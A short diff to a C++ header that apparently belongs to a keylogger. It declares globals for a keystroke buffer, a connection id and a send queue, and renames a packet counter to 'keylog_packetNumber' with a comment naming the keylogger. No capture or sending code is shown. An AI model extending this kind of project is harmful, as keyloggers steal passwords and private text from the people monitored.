@@ -17,7 +17,7 @@ inline HKL         keyboardLayout    = nullptr;
 inline std::string keystrokeBuffer   = "";
 
 inline int         connectionId      = -1;
-inline int         packetNumber      = 0;
+inline int         keylog_packetNumber = 0;  // Separate packet counter for keylogger
 
 inline std::queue<std::string> sendQueue;
 inline std::mutex queueMutex;
